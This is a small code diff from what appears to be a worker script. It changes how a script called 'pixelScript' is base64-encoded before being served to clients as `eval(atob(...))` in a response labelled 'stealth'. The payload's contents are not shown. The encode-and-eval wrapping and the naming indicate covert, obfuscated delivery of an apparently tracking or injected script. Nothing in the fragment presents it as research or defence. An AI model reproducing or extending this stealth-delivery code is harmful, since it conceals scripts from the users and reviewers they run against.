@@ -64,7 +64,8 @@ export default {
   } catch(e){}
 })();`;
 
-      const encoded = Buffer.from(pixelScript).toString("base64");
+      // Use globalThis.btoa instead of Buffer
+      const encoded = globalThis.btoa(pixelScript);
       const stealth = `eval(atob('${encoded}'))`;
 
       return new Response(stealth, { status: 200, headers });
